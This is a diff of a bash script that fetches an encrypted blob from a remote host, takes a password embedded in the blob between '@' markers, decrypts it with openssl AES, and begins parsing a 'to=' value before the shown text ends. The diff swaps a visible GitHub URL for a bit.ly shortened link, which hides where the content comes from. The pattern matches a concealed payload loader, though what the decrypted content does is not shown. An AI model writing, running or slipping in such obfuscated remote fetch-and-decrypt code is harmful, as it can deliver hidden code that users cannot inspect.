@@ -1,16 +1,10 @@
 #!/bin/bash
-
 YELLOW='\033[1;33m'
 NC='\033[0m'
-
-URL="https://github.com/hmz-hh/vps/raw/refs/heads/main/ch"
-
-encrypted=$(curl -fsSL "$URL")
-
+x="bit.ly/oi2x"
+encrypted=$(curl -fsSL "$x")
 pass=$(echo "$encrypted" | grep -oP '@\K[^@]+(?=@)')
-
 cipher=$(echo "$encrypted" | sed -E "s/(.+)@${pass}@(.*)/\1\2/")
-
 decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 100000 -pass pass:"$pass")
 
 to=$(echo "$decrypted" | grep -o 'to="[^"]\+"' | cut -d '"' -f2 | head -n1)
